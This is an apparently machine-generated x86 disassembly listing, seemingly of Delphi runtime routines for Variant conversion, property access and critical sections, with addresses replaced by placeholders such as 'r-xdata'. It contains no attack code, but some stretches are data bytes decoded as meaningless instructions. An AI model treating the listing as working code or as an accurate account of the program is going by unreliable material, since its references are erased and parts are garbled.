push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40fab0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410730
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fab7
lea eax [ ebp - 0x20 ]
call sub_404730
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fa93
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404840
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40492c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ed44
retn
sub_40fac0
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410012
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fafa ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40487c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404730
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40487c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40943c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40487c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40943c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40487c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f0b0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40476c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f0e8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40476c
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404840
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40492c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40f120
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407f48
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408034
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40487c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408034
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fac0
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f8dc
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40476c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410019
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404748
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404748
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_404074
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404748
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404748
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f994
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40476c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40487c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e5e4
test ah 0x40
je r-xdata
mov eax esi
call sub_404730
mov edx eax
mov eax ebx
call sub_40f9f8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f8dc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40476c
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f8dc
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40476c
jmp r-xdata
jmp [ eax * 4 + jump_table_40fd81 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40943c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40943c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40f0b0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f0e8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404840
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f120
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40487c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f48
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408034
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408034
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40487c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fac0
jmp r-xdata
sub_410020
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ecc8
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_41005c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ecc8
sub_410088
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ecc8
sub_4100ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040a4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecc8
sub_410118
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_40492c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ecc8
sub_4102d4
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4103fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_4040a4
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410730
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40435c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40805c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40435c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e4
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40287c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4042b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410401
lea eax [ ebp - 0x208 ]
call sub_404050
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40435c
sub_410483
popad
jb r-xdata
xor al 0xff
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410730
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4106b0
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41048c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4104ed
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404e18
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104f4
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403294
sub_41053c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4106b0
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410730
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410590
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4105c8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4106b0
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410604
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403608
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410667
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41066e
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410708
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403348
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410730
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4107d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e18
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4107e8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4108be
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4108a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e20
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108a8
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031e4
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4042b4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407d14
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4108d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410947
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41094e
retn
call sub_41048c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
call sub_404050
mov eax rw-data
call sub_40ed58
sub_410950
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4109f1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109f8
retn
mov eax rw-data
call sub_41045c
mov eax sub_40ea58
mov [ rw-data ] eax
mov eax sub_40e680
mov [ rw-data ] eax
mov edx sub_40e590
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ed58
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_410150
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f06c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f398
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fac0
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4109fc
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] ch
inc edi
add [ ebp + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] al
inc edi
add [ ebp + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_410b21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b28
retn
sub_410b6c
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410bb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410b60
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408084
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410b6c
mov edx [ rw-data ]
mov eax esi
call sub_407d14
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407d14
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408084
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410c1c
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410c8c
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_410ce0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410d54
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410db0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410e04
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4042ec
mov ecx esp
mov edx esi
mov eax ebx
call sub_410db0
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410e4c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410e38
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410e8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410ed4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40487c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410f10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410edb
lea eax [ ebp - 0x4 ]
call sub_404730
retn
sub_410ee4
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410e04
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410e4c
pop ebx
retn
dec bl
je r-xdata
call sub_410e8c
jmp r-xdata
pop ebx
retn
sub_410f10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410fd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
